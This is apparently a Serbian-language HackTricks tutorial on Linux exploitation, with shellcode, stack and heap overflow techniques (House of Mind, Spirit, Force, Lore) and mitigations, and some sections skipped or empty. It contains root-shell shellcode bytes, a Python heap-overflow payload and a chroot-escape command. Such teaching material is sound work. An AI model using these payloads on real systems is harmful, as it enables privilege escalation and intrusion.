# Linux Exploiting (Osnovno)

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJATELJSTVO**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## **2.SHELLCODE**

Vidi prekide kernela: cat /usr/include/i386-linux-gnu/asm/unistd\_32.h | grep “\_\_NR\_”

setreuid(0,0); // \_\_NR\_setreuid 70\
execve(“/bin/sh”, args\[], NULL); // \_\_NR\_execve 11\
exit(0); // \_\_NR\_exit 1

xor eax, eax ; čistimo eax\
xor ebx, ebx ; ebx = 0 jer nema argumenata za prosleđivanje\
mov al, 0x01 ; eax = 1 —> \_\_NR\_exit 1\
int 0x80 ; Izvršiti syscall

**nasm -f elf assembly.asm** —> Vraća nam .o datoteku\
**ld assembly.o -o shellcodeout** —> Daje nam izvršnu datoteku formiranu od asemblerskog koda i možemo izvući opkodove sa **objdump**\
**objdump -d -Mintel ./shellcodeout** —> Da vidimo da je zaista naš shellcode i izvučemo OpKodove

**Proverite da li shellcode funkcioniše**
```
char shellcode[] = “\x31\xc0\x31\xdb\xb0\x01\xcd\x80”

void main(){
void (*fp) (void);
fp = (void *)shellcode;
fp();
}<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">​</span>
```
Da biste videli da li se sistemski pozivi pravilno izvršavaju, treba da kompajlirate prethodni program i sistemski pozivi treba da se pojave u **strace ./KOMPILIRANI_PROGRAM**

Prilikom kreiranja shellcode-a možete koristiti trik. Prva instrukcija je skok na poziv. Poziv poziva originalni kod i dodaje EIP na stek. Nakon poziva smo ubacili string koji nam je potreban, tako da sa tim EIP-om možemo pokazati na string i nastaviti izvršavanje koda.

PRIMER **TRICK (/bin/sh)**:
```
jmp                 0x1f                                        ; Salto al último call
popl                %esi                                       ; Guardamos en ese la dirección al string
movl               %esi, 0x8(%esi)       ; Concatenar dos veces el string (en este caso /bin/sh)
xorl                 %eax, %eax             ; eax = NULL
movb  %eax, 0x7(%esi)     ; Ponemos un NULL al final del primer /bin/sh
movl               %eax, 0xc(%esi)      ; Ponemos un NULL al final del segundo /bin/sh
movl   $0xb, %eax               ; Syscall 11
movl               %esi, %ebx               ; arg1=“/bin/sh”
leal                 0x8(%esi), %ecx      ; arg[2] = {“/bin/sh”, “0”}
leal                 0xc(%esi), %edx      ; arg3 = NULL
int                    $0x80                         ; excve(“/bin/sh”, [“/bin/sh”, NULL], NULL)
xorl                 %ebx, %ebx             ; ebx = NULL
movl   %ebx, %eax
inc                   %eax                          ; Syscall 1
int                    $0x80                         ; exit(0)
call                  -0x24                          ; Salto a la primera instrución
.string             \”/bin/sh\”                               ; String a usar<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">​</span>
```
**EKSPLOATISANJE korišćenjem Stack-a (/bin/sh):**
```
section .text
global _start
_start:
xor                  eax, eax                     ;Limpieza
mov                al, 0x46                      ; Syscall 70
xor                  ebx, ebx                     ; arg1 = 0
xor                  ecx, ecx                     ; arg2 = 0
int                    0x80                           ; setreuid(0,0)
xor                  eax, eax                     ; eax = 0
push   eax                             ; “\0”
push               dword 0x68732f2f ; “//sh”
push               dword 0x6e69622f; “/bin”
mov                ebx, esp                     ; arg1 = “/bin//sh\0”
push               eax                             ; Null -> args[1]
push               ebx                             ; “/bin/sh\0” -> args[0]
mov                ecx, esp                     ; arg2 = args[]
mov                al, 0x0b                      ; Syscall 11
int                    0x80                           ; excve(“/bin/sh”, args[“/bin/sh”, “NULL”], NULL)
```
**EJ FNSTENV:**
```
fabs
fnstenv [esp-0x0c]
pop eax                     ; Guarda el EIP en el que se ejecutó fabs
…
```
**Lovac na jaja:**

Ovo je mali kod koji prolazi kroz stranice memorije povezane s procesom u potrazi za shellcode-om koji je tamo spremljen (traži neki potpis koji je postavljen u shellcode-u). Korisno u slučajevima kada imate samo malo prostora za ubacivanje koda.

**Polimorfni shellkodovi**

To su šifrovani shellkodovi koji imaju male kodove koji ih dešifruju i skoče na njih, koristeći trik Call-Pop, ovde je **primer Cezarove šifre**:
```
global _start
_start:
jmp short magic
init:
pop     esi
xor      ecx, ecx
mov    cl,0                              ; Hay que sustituir el 0 por la longitud del shellcode (es lo que recorrerá)
desc:
sub     byte[esi + ecx -1], 0 ; Hay que sustituir el 0 por la cantidad de bytes a restar (cifrado cesar)
sub     cl, 1
jnz       desc
jmp     short sc
magic:
call init
sc:
;Aquí va el shellcode
```
## **5. Dodatne metode**

**Ret2Ret**

Koristan kada nije moguće ubaciti adresu steka u EIP (proverava se da EIP ne sadrži 0xbf) ili kada nije moguće izračunati lokaciju shell koda. Međutim, ranjiva funkcija prihvata parametar (ovde će ići shell kod).

Na ovaj način, menjanjem EIP sa adresom **ret**, učitaće se sledeća adresa (koja je adresa prvog argumenta funkcije). Drugim rečima, učitaće se shell kod.

Exploit bi izgledao ovako: SHELLCODE + Punjenje (do EIP) + **\&ret** (naredni bajtovi steka pokazuju na početak shell koda jer se adresa prosleđenog parametra stavlja na stek)

Izgleda da funkcije poput **strncpy** nakon završetka brišu adresu gde je bio smešten shell kod, onemogućavajući ovu tehniku. Drugim rečima, adresa koja se prosleđuje funkciji kao argument (ona koja čuva shell kod) se menja u 0x00, pa kada se pozove drugi **ret**, naiđe se na 0x00 i program se ruši.



**Muratova tehnika**

U linuxu, svi programi se mapiraju počevši od 0xbfffffff

Posmatrajući kako se konstruiše stek novog procesa u linuxu, može se razviti exploit tako da program bude pokrenut u okruženju gde je jedina promenljiva shell kod. Adresa ove promenljive se može izračunati kao: addr = 0xbfffffff - 4 - strlen(NOMBRE\_ejecutable\_completo) - strlen(shellcode)

Na ovaj način, lako se dobija adresa gde se nalazi promenljiva okruženja sa shell kodom.

Ovo se može postići zahvaljujući funkciji execle koja omogućava kreiranje okruženja koje ima samo željene promenljive okruženja

**Prekoračenja celih brojeva**

Ova vrsta prekoračenja se dešava kada promenljiva nije spremna da podrži tako veliki broj koji joj se prosleđuje, možda zbog zabune između promenljivih sa i bez znaka, na primer:
```c
#include <stdion.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char *argv[]){
int len;
unsigned int l;
char buffer[256];
int i;
len = l = strtoul(argv[1], NULL, 10);
printf("\nL = %u\n", l);
printf("\nLEN = %d\n", len);
if (len >= 256){
printf("\nLongitus excesiva\n");
exit(1);
}
if(strlen(argv[2]) < l)
strcpy(buffer, argv[2]);
else
printf("\nIntento de hack\n");
return 0;
}
```
U prethodnom primeru vidimo da program očekuje 2 parametra. Prvi je dužina sledećeg niza, a drugi je sam niz.

Ako prosledimo negativan broj kao prvi parametar, program će prikazati da je len < 256 i proći će taj filter, a takođe će strlen(buffer) biti manji od l, jer je l unsigned int i biće veoma velik.

Ovaj tip preplavljenja ne pokušava da nešto upiše u proces programa, već da prevaziđe loše dizajnirane filtere kako bi iskoristio druge ranjivosti.

**Nekonfigurisane promenljive**

Nije poznato koji će vrednost uzeti nekonfigurisana promenljiva i bilo bi zanimljivo posmatrati je. Moguće je da će uzeti vrednost koju je imala promenljiva iz prethodne funkcije i da je ova kontrolisana od strane napadača.

##

###

###

###

### **.fini\_array**

Essentially this is a structure with **functions that will be called** before the program finishes. This is interesting if you can call your **shellcode just jumping to an address**, or in cases where you need to go back to main again to **exploit the format string a second time**.
```bash
objdump -s -j .fini_array ./greeting

./greeting:     file format elf32-i386

Contents of section .fini_array:
8049934 a0850408

#Put your address in 0x8049934
```
Napomena da ovo **neće** stvoriti **večnu petlju** jer kada se vratite u glavni program, kanarinci će primetiti, kraj steka može biti oštećen i funkcija više neće biti ponovo pozvana. Dakle, s ovim ćete moći **izvršiti još 1 put** ranjivost.

### **Formatiranje stringova za ispis sadržaja**

Formatni string takođe može biti zloupotrebljen da **izbaci sadržaj** iz memorije programa. Na primer, u sledećoj situaciji postoji **lokalna promenljiva na steku koja pokazuje na zastavu**. Ako **pronađete** gde je u **memoriji** **pokazivač** na **zastavu**, možete naterati **printf da pristupi** toj **adresi** i **ispise** zastavu:

Dakle, zastava je na **0xffffcf4c**

![](<../../.gitbook/assets/image (618) (2).png>)

Iz curenja možete videti da je **pokazivač na zastavu** u **8.** parametru:

![](<../../.gitbook/assets/image (623).png>)

Dakle, **pristupanjem 8. parametru** možete dobiti zastavu:

![](<../../.gitbook/assets/image (624).png>)

Napomena da nakon **prethodnog napada** i shvatanja da možete **procureti sadržaj**, možete postaviti pokazivače na **`printf`** na odeljak gde je **izvršiv** program i **potpuno ga isprazniti**!

### **DTOR**

{% hint style="danger" %}
Danas je vrlo **čudno naći binarnu datoteku sa odeljkom dtor**.
{% endhint %}

Destruktori su funkcije koje se **izvršavaju pre završetka programa**. Ako uspete **upisati** adresu **shell koda** u **`__DTOR_END__`**, to će se **izvršiti** pre završetka programa. Dobijte adresu ovog odeljka sa:
```bash
objdump -s -j .dtors /exec
rabin -s /exec | grep “__DTOR”
```
Obično ćete pronaći **DTOR** sekciju **između** vrednosti `ffffffff` i `00000000`. Dakle, ako vidite samo te vrednosti, to znači da **nema registrovane funkcije**. Dakle, **prepišite** **`00000000`** sa **adresom** **shell koda** da biste ga izvršili.

### **Formatiranje stringova za preplavljivanje bafera**

**Sprintf** pomera formatiran string **u** **promenljivu**. Stoga, možete zloupotrebiti **formatiranje** stringa da izazovete **preplavljivanje bafera u promenljivoj** gde se sadržaj kopira.\
Na primer, payload `%.44xAAAA` će **upisati 44B+"AAAA" u promenljivu**, što može izazvati preplavljivanje bafera.

### **\_\_atexit Strukture**

{% hint style="danger" %}
Danas je vrlo **čudno iskoristiti ovo**.
{% endhint %}

**`Atexit()`** je funkcija kojoj se **prosleđuju druge funkcije kao parametri.** Ove **funkcije** će biti **izvršene** prilikom izvršavanja **`exit()`** ili **povratka** iz **main** funkcije.\
Ako možete **modifikovati** **adresu** bilo koje od ovih **funkcija** da pokazuje na shell kod na primer, dobićete **kontrolu** nad **procesom**, ali trenutno je to komplikovanije.\
Trenutno su **adrese funkcija** koje treba izvršiti **skrivene** iza nekoliko struktura i na kraju adrese na koje pokazuju nisu adrese funkcija, već su **šifrovane XOR**-om i pomeraji sa **slučajnim ključem**. Tako da je ovaj vektor napada trenutno **nije vrlo koristan bar na x86** i **x64\_86** arhitekturama.\
**Funkcija za šifrovanje** je **`PTR_MANGLE`**. **Druge arhitekture** poput m68k, mips32, mips64, aarch64, arm, hppa... **ne implementiraju funkciju za šifrovanje** jer **vraćaju isto** što su primile kao ulaz. Dakle, ove arhitekture bi bile podložne ovom vektoru napada.

### **Setjmp() & longjmp()**

{% hint style="danger" %}
Danas je vrlo **čudno iskoristiti ovo**.
{% endhint %}

**`Setjmp()`** omogućava da se **sačuva** **kontekst** (registri)\
**`Longjmp()`** omogućava da se **vrati** **kontekst**.\
Sačuvani registri su: `EBX, ESI, EDI, ESP, EIP, EBP`\
Ono što se dešava je da se EIP i ESP prosleđuju kroz **`PTR_MANGLE`** funkciju, tako da su **arhitekture podložne ovom napadu iste kao gore**.\
Koriste se za oporavak grešaka ili prekide.\
Međutim, prema onome što sam pročitao, ostali registri nisu zaštićeni, **pa ako postoji `call ebx`, `call esi` ili `call edi`** unutar funkcije koja se poziva, kontrola može biti preuzeta. Ili takođe možete modifikovati EBP da biste promenili ESP.

**VTable i VPTR u C++**

Svaka klasa ima **Vtabelu** koja je niz **pokazivača na metode**.

Svaki objekat **klase** ima **VPtr** koji je **pokazivač** na niz svoje klase. VPtr je deo zaglavlja svakog objekta, tako da ako se postigne **prepisivanje** **VPtr-a** može se **modifikovati** da **pokazuje** na lažnu metodu tako da izvršavanje funkcije ode na shell kod.

## **Preventivne mere i izbegavanja**

###

**Zamena Libsafe-a**

Aktivira se sa: LD\_PRELOAD=/lib/libsafe.so.2\
ili\
“/lib/libsave.so.2” > /etc/ld.so.preload

Pozivi nekih nesigurnih funkcija se presreću sigurnijim. Nije standardizovano. (samo za x86, ne za kompilacije sa -fomit-frame-pointer, ne statičke kompilacije, ne sve ranjive funkcije postaju sigurne i LD\_PRELOAD ne radi na binarnim fajlovima sa suid).

**ASCII Armored Address Space**

Sastoji se u učitavanju deljenih biblioteka od 0x00000000 do 0x00ffffff kako bi uvek postojao bajt 0x00. Međutim, ovo zapravo ne zaustavlja skoro nijedan napad, a posebno ne u little endian formatu.

**Ret2plt**

Sastoji se u izvođenju ROP-a tako da se pozove funkcija strcpy@plt (iz plt-a) i usmeri na unos u GOT i kopira prvi bajt funkcije koju želite pozvati (system()). Zatim se isto radi usmeravajući se na GOT+1 i kopira se 2. bajt system()... Na kraju se poziva sačuvana adresa u GOT koja će biti system()

**Kavezi sa chroot()**

debootstrap -arch=i386 hardy /home/user —> Instalira osnovni sistem u određeni poddirektorijum

Administrator može izaći iz ovih kaveza tako što će uraditi: mkdir foo; chroot foo; cd ..

**Instrumentacija koda**

Valgrind —> Traži greške\
Memcheck\
RAD (Return Address Defender)\
Insure++
**shellcode = "\xeb\x0caaaabbbbcccc" #jm 12 + 12 bajtova punjenja**

**shellcode += "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" \\**

**"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" \\**

**"\x80\xe8\xdc\xff\xff\xff/bin/sh";**

**prev\_size = pack("\<I”, 0xfffffff0) #Bit koji označava da je prethodni komad slobodan treba biti postavljen na 1**

**fake\_size = pack("\<I”, 0xfffffffc) #-4, kako bi se mislilo da je "size" trećeg komada 4 bajta unazad (ukazuje na prev\_size) jer se tu proverava da li je drugi komad slobodan**

**addr\_sc = pack("\<I", 0x0804a008 + 8) #Na početku payloada dodajemo 8 bajtova punjenja**

**got\_free = pack("\<I", 0x08048300 - 12) #Adresa free() u plt-12 (biće prebrisana kako bi se shellcode pokrenula drugi put kada se free pozove)**

**payload = "aaaabbbb" + shellcode + "b"\*(512-len(shellcode)-8) #Kako je rečeno, payload počinje sa 8 bajtova punjenja**

**payload += prev\_size + fake\_size + got\_free + addr\_sc #Modifikuje se drugi komad, got\_free pokazuje gde ćemo sačuvati adresu addr\_sc + 12**

**os.system("./8.3.o " + payload)**

**unset() oslobađanje u obrnutom redosledu (wargame)**

Kontrolišemo 3 uzastopna chunk-a i oslobađaju se u obrnutom redosledu od rezervacije.

U tom slučaju:

U chunk-u c se stavlja shellcode

Chunk a koristimo da prepišemo b tako da size ima deaktiviran bit PREV\_INUSE kako bi mislio da je chunk a slobodan.

Takođe, u zaglavlju b se prepiše size da bude -4.

Tada će program misliti da je "a" slobodan i u binu, pa će pozvati unlink() da ga odveže. Međutim, pošto je PREV\_SIZE u zaglavlju -4, misliće da chunk "a" zapravo počinje na b+4. Drugim rečima, pozvaće unlink() na chunk koji počinje na b+4, pa će u b+12 biti pokazivač "fd", a u b+16 pokazivač "bk".

Na taj način, ako stavimo adresu shellcode u bk i adresu funkcije "puts()" -12 u fd, imamo naš payload.

**Tehnika Frontlink**

Poziva se frontlink kada se nešto oslobodi i nijedan od susednih chunk-ova nije slobodan, umesto pozivanja unlink() direktno se poziva frontlink().

Korisna ranjivost kada malloc koji se napada nikada nije oslobođen (free()).

Potrebno je:

Buffer koji može biti preplavljen funkcijom unos podataka

Buffer koji je susedan ovom koji treba biti oslobođen i čije će se polje fd u zaglavlju promeniti zbog prelivanja prethodnog bafera

Buffer koji treba osloboditi sa veličinom većom od 512 ali manjom od prethodnog bafera

Buffer deklarisan pre koraka 3 koji omogućava prepisivanje prev\_size ovog

Na ovaj način, preplavljujući dva malloc-a na nekontrolisan način i jedan na kontrolisan način koji se oslobađa samo jednom, možemo napraviti eksploataciju.

**Ranjivost double free()**

Ako se dva puta pozove free() sa istim pokazivačem, dva bin-a pokazuju na istu adresu.

U slučaju da se želi ponovo koristiti jedan, to se može uraditi bez problema. U slučaju da se želi koristiti drugi, dodeliće mu se isti prostor, pa ćemo imati pokazivače "fd" i "bk" sa lažnim podacima koje će upisati prethodna rezervacija.

**After free()**

Prethodno oslobođeni pokazivač se ponovo koristi bez kontrole.

## **8 Preplavljenosti hipa: Napredni eksploiti**

Tehnike Unlink() i FrontLink() su uklonjene modifikacijom funkcije unlink().

**The house of mind**

Potrebno je samo jedno pozivanje free() da bi se izazvalo izvršavanje proizvoljnog koda. Potrebno je pronaći drugi chunk koji može biti preplavljen od strane prethodnog i oslobođen.

Pozivanje free() dovodi do poziva public\_fREe(mem), što radi:

mstate ar\_ptr;

mchunkptr p;

…

p = mem2chunk(mes); —> Vraća pokazivač na adresu na kojoj počinje chunk (mem-8)

…

ar\_ptr = arena\_for_chunk(p); —> chunk\_non\_main\_arena(ptr)?heap\_for\_ptr(ptr)->ar\_ptr:\&main\_arena \[1]

…

\_int\_free(ar\_ptr, mem);

}

U \[1] proverava se polje size bit NON\_MAIN\_ARENA, koje se može promeniti kako bi provera vratila tačno i izvršila heap\_for\_ptr() koja vrši and na "mem" ostavljajući 0 poslednjih 2.5 bajtova (u našem slučaju od 0x0804a000 ostavlja 0x08000000) i pristupa 0x08000000->ar\_ptr (kao da je struktura heap\_info)

Na ovaj način, ako možemo kontrolisati chunk na primer na 0x0804a000 i treba osloboditi chunk na **0x081002a0** možemo doći do adrese 0x08100000 i upisati šta god želimo, na primer **0x0804a000**. Kada se ovaj drugi chunk oslobodi, otkriće da heap\_for\_ptr(ptr)->ar\_ptr vraća ono što smo upisali na 0x08100000 (jer se primenjuje and na 0x081002a0 koji smo videli ranije i odatle se izvlači vrednost prvih 4 bajta, ar\_ptr)

Na taj način se poziva \_int\_free(ar\_ptr, mem), odnosno **\_int\_free(0x0804a000, 0x081002a0)**\
**\_int\_free(mstate av, Void\_t\* mem){**\
…\
bck = unsorted\_chunks(av);\
fwd = bck->fd;\
p->bk = bck;\
p->fd = fwd;\
bck->fd = p;\
fwd->bk = p;

..}

Kao što smo videli ranije, možemo kontrolisati vrednost av, jer je to ono što pišemo u chunk koji će biti oslobođen.

Kako je definisano unsorted\_chunks, znamo da:\
bck = \&av->bins\[2]-8;\
fwd = bck->fd = \*(av->bins\[2]);\
fwd->bk = \*(av->bins\[2] + 12) = p;

Stoga, ako u av->bins\[2] upišemo vrednost \_\_DTOR\_END\_\_-12, u poslednjoj instrukciji će biti upisana vrednost u \_\_DTOR\_END\_\_ adresa drugog chunk-a.

Drugim rečima, u prvom chunk-u na početku treba staviti adresu \_\_DTOR\_END\_\_-12 mnogo puta jer će av->bins\[2] to izvući

Na adresi na koju padne adresa drugog chunk-a sa poslednjih 5 nula treba upisati adresu ovog prvog chunk-a kako bi heap\_for\_ptr() mislio da je ar\_ptr na početku prvog chunk-a i izvukao av->bins\[2] odatle

U drugom chunk-u i zahvaljujući prvom, prepisujemo prev\_size sa jump 0x0c i size sa nečim da aktivira -> NON\_MAIN\_ARENA

Zatim u drugom chunk-u stavljamo gomilu nops i na kraju shellcode

Na taj način će se pozvati \_int\_free(CHUNK1, CHUNK2) i pratiti instrukcije za upisivanje u \_\_DTOR\_END\_\_ adresu prev\_size CHUNK2 koji će skočiti na shellcode.
Da biste primenili ovu tehniku, potrebno je da se ispune određeni zahtevi koji malo komplikuju payload.

Ova tehnika više nije primenjiva jer je gotovo isti zakrpa primenjena kao i za unlink. Upoređuju se da li novi sajt na koji se pokazuje takođe pokazuje na njega.

**Fastbin**

To je varijanta The house of mind

interesuje nas izvršavanje sledećeg koda do kojeg se dolazi nakon prvog provere u funkciji \_int\_free()

fb = &(av->fastbins\[fastbin\_index(size)] —> Gde je fastbin\_index(sz) —> (sz >> 3) - 2

…

p->fd = \*fb

\*fb = p

Na ovaj način, ako se postavi u "fb", daje adresu funkcije u GOT-u, na ovu adresu će se postaviti adresa prebrisana. Za ovo će biti potrebno da je arena blizu adresa dtors. Tačnije, av->max\_fast treba da bude na adresi koju ćemo prebrisati.

S obzirom da smo sa The House of Mind videli da mi kontrolišemo poziciju av.

Zato, ako u polje size stavimo veličinu 8 + NON\_MAIN\_ARENA + PREV\_INUSE —> fastbin\_index() će vratiti fastbins\[-1], koji će pokazivati na av->max\_fast

U ovom slučaju, av->max\_fast će biti adresa koja će biti prebrisana (ne na koju pokazuje, već ta pozicija će biti prebrisana).

Takođe, mora se ispuniti uslov da susedni deo oslobođenog dela bude veći od 8 -> Pošto smo rekli da je veličina oslobođenog dela 8, u ovom lažnom delu samo treba staviti veličinu veću od 8 (kako će shellcode biti u oslobođenom delu, na početku treba staviti jmp koji će pasti na nops).

Takođe, isti lažni deo mora biti manji od av->system\_mem. av->system\_mem je udaljen 1848 bajtova.

Zbog nula u \_DTOR\_END\_ i malog broja adresa u GOT-u, nijedna adresa iz ovih sekcija nije pogodna za prebrisivanje, pa pogledajmo kako primeniti fastbin za napad na stek.

Još jedan način napada je preusmeravanje **av** ka steku.

Ako promenimo veličinu da bude 16 umesto 8, tada: fastbin\_index() će vratiti fastbins\[0] i možemo iskoristiti ovo da prepišemo stek.

Za ovo ne sme biti nikakvih canary vrednosti ili čudnih vrednosti na steku, zapravo moramo biti u ovom slučaju: 4 bajta nula + EBP + RET

Potrebno je da **av** bude na ovoj adresi i prvi element **av** je mutex koji mora biti 0.

**av->max\_fast** će biti EBP i biće vrednost koja će nam omogućiti da preskočimo ograničenja.

U **av->fastbins\[0]** će se prebrisati sa adresom **p** i biće RET, tako da će se preskočiti do shellcode.

Takođe, u **av->system\_mem** (1484 bajta iznad pozicije na steku) će biti dovoljno smeća koje će nam omogućiti da preskočimo proveru koja se vrši.

Takođe, mora se ispuniti uslov da susedni deo oslobođenog dela bude veći od 8 -> Pošto smo rekli da je veličina oslobođenog dela 16, u ovom lažnom delu samo treba staviti veličinu veću od 8 (kako će shellcode biti u oslobođenom delu, na početku treba staviti jmp koji će pasti na nops koji idu posle polja size novog lažnog dela).

**The House of Spirit**

U ovom slučaju tražimo da imamo pokazivač na malloc koji može biti promenljiv od strane napadača (na primer, da pokazivač bude na steku ispod mogućeg prelivanja promenljive).

Na taj način, mogli bismo da navedemo ovaj pokazivač da pokazuje gde god želimo. Međutim, ne svako mesto je validno, veličina lažnog dela mora biti manja od av->max\_fast i tačnije jednaka veličini koja će biti tražena u budućem pozivu malloc()+8. Zbog toga, ako znamo da se nakon ovog ranjivog pokazivača poziva malloc(40), veličina lažnog dela mora biti jednaka 48.

Na primer, ako program pita korisnika za broj, mogli bismo uneti 48 i usmeriti promenljivi pokazivač malloc-a na sledećih 4 bajta (koji bi mogli pripadati EBP-u sa srećom, tako da 48 ostaje iza, kao da je veličina zaglavlja). Takođe, adresa ptr-4+48 mora zadovoljiti nekoliko uslova (u ovom slučaju ptr=EBP), tj. 8 < ptr-4+48 < av->system\_mem.

U slučaju da se ovo ispuni, kada se pozove sledeći malloc koji smo rekli da je malloc(40), kao adresi će biti dodeljena adresa EBP-a. U slučaju da napadač takođe može kontrolisati šta se piše u ovom malloc-u, može prebrisati kako EBP tako i EIP sa adresom koju želi.

Mislim da je to zato što kada se oslobodi free() čuvaće se da u adresi koja pokazuje na EBP steka postoji deo tačne veličine za novi malloc() koji se želi rezervisati, pa će mu biti dodeljena ta adresa.

**The House of Force**

Potrebno je:

* Preplavljivanje dela koje omogućava prebrisivanje wilderness-a
* Poziv malloc() sa veličinom definisanom od strane korisnika
* Poziv malloc() čiji podaci mogu biti definisani od strane korisnika

Prvo što se radi je prebrisivanje veličine dela wilderness sa veoma velikom vrednošću (0xffffffff), tako da će svaki zahtev za memorijom dovoljno velik biti obrađen u \_int\_malloc() bez potrebe za proširivanjem hipa.

Drugo je promena av->top tako da pokazuje na deo memorije pod kontrolom napadača, kao što je stek. U av->top će se postaviti \&EIP - 8.

Mora se prebrisati av->top tako da pokazuje na deo memorije pod kontrolom napadača:

victim = av->top;

remainder = chunck\_at\_offset(victim, nb);

av->top = remainder;

Victim prikuplja vrednost adrese trenutnog dela wilderness-a (trenutni av->top) i remainder je tačno suma te adrese plus količina bajtova tražena od strane malloc(). Dakle, ako je \&EIP-8 na 0xbffff224 i av->top sadrži 0x080c2788, tada će količina koju moramo rezervisati u kontrolisanom malloc-u da bi av->top pokazivao na $EIP-8 za sledeći malloc() biti:

0xbffff224 - 0x080c2788 = 3086207644.

Na taj način će se sačuvati promenjena vrednost u av->top i sledeći malloc će pokazivati na EIP i moći će ga prebrisati.

Važno je znati da veličina novog dela wilderness bude veća od zahteva poslednjeg malloc(). Drugim rečima, ako wilderness pokazuje na \&EIP-8, veličina će biti tačno u polju EBP steka.

**The House of Lore**

**Korupcija SmallBin**

Oslobođeni delovi se ubacuju u bin u zavisnosti od njihove veličine. Ali pre nego što se ubace, čuvaju se u unsorted bins. Deo koji je oslobođen ne ide odmah u svoj bin već ostaje u unsorted bins. Zatim, ako se rezerviše novi deo i prethodno oslobođeni može poslužiti, vraća se, ali ako se rezerviše veći deo, oslobođeni deo u unsorted bins se stavlja u odgovarajući bin.

Da bi se došlo do ranjivog koda, zahtev za memorijom mora biti veći od av->max\_fast (obično 72) i manji od MIN\_LARGE\_SIZE (512).

Ako u binu postoji deo odgovarajuće veličine za zahtev, on se vraća nakon što se odveže:

bck = victim->bk; Pokazuje na prethodni deo, to je jedina informacija koju možemo promeniti.

bin->bk = bck; Pretposlednji deo postaje poslednji, ako bck pokazuje na stek, sledećem rezervisanom delu će biti dodeljena ova adresa

bck->fd = bin; Zatvara se lista tako što ovaj pokazuje na bin

Potrebno je:
Rezervišu se dva malloc-a, tako da se prvi može preplaviti nakon što je drugi oslobođen i ubačen u svoj bin (tj. rezervisan je malloc veći od drugog dela pre prelivanja)

Malloc rezervisan za adresu koju odabere napadač mora biti pod kontrolom napadača.

Cilj je sledeći, ako možemo preplaviti heap koji ima oslobođen deo ispod i u svom binu, možemo promeniti njegov pokazivač bk. Ako promenimo pokazivač bk i taj deo postane prvi na listi binova i rezervisan je, bin će biti prevaren i reći će mu se da je sledeći deo liste (sledeći koji se nudi) na lažnoj adresi koju smo postavili (na stack ili GOT na primer). Dakle, ako se rezerviše još jedan deo i napadač ima dozvole na njemu, dobiće deo na željenoj poziciji i moći će da piše u njega.

Nakon što se modifikovani deo oslobodi, potrebno je rezervisati deo veći od oslobođenog, tako da modifikovani deo izađe iz unsorted binova i ubaci se u svoj bin.

Kada je u svom binu, vreme je da se promeni pokazivač bk preko prelivanja kako bi pokazivao na adresu koju želimo da prepisujemo.

Dakle, bin mora da sačeka da se dovoljno puta pozove malloc() kako bi se ponovo koristio modifikovani bin i prevario bin tako što će mu se reći da je sledeći deo na lažnoj adresi. Zatim će biti dat deo koji nas zanima.

Da bi se ranjivost izvršila što je pre moguće, idealno bi bilo: Rezervacija ranjivog dela, rezervacija dela koji će se modifikovati, oslobođenje ovog dela, rezervacija dela većeg od onog koji će se modifikovati, modifikacija dela (ranjivost), rezervacija dela iste veličine kao ranjivi deo i rezervacija drugog dela iste veličine koji će pokazivati na odabranu adresu.

Za zaštitu od ovog napada koristi se tipična provera da deo "nije" lažan: proverava se da li bck->fd pokazuje na žrtvu. Drugim rečima, u našem slučaju, ako pokazivač fd* lažnog dela pokazuje na žrtvu na stacku. Da bi prevazišao ovu zaštitu, napadač bi trebalo nekako da bude u mogućnosti da napiše (verovatno preko stacka) na odgovarajuću adresu adresu žrtve. Tako će izgledati kao pravi deo.

**Korupcija LargeBin**

Potrebni su isti zahtevi kao i pre, plus neki dodatni, osim toga, rezervisani delovi moraju biti veći od 512.

Napad je kao i prethodni, tj. treba promeniti pokazivač bk i potrebni su svi ti pozivi malloc(), ali takođe treba promeniti veličinu modifikovanog dela tako da taj size - nb bude < MINSIZE.

Na primer, treba postaviti size na 1552 kako bi 1552 - 1544 = 8 < MINSIZE (oduzimanje ne sme biti negativno jer se upoređuje sa unsigned)

Takođe je uveden zakrpa da bi se to učinilo još komplikovanijim.

**Heap Spraying**

Osnovna ideja je rezervisati što je više moguće memorije za heap-ove i popuniti ih jastukom od nopsa završenim shellcode-om. Takođe se koristi 0x0c kao jastuk. Pokušaće se skočiti na adresu 0x0c0c0c0c, pa ako se neka adresa prepisuje sa ovim jastukom, skočiće tamo. Osnovna taktika je rezervisati što je više moguće kako bi se videlo da li se prepisuje neki pokazivač i skočiti na 0x0c0c0c0c u nadi da će tamo biti nops.

**Heap Feng Shui**

Sastoji se u cementiranju memorije putem rezervacija i oslobođenja kako bi se ostavili rezervisani delovi između slobodnih delova. Bafer za prelivanje će se nalaziti u jednom od tih delova.

## Interesantni kursevi

* [https://guyinatuxedo.github.io/](https://guyinatuxedo.github.io)
* [https://github.com/RPISEC/MBE](https://github.com/RPISEC/MBE)
* [https://ir0nstone.gitbook.io/notes](https://ir0nstone.gitbook.io/notes)

## **Reference**

* [**https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html**](https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html)

<details>

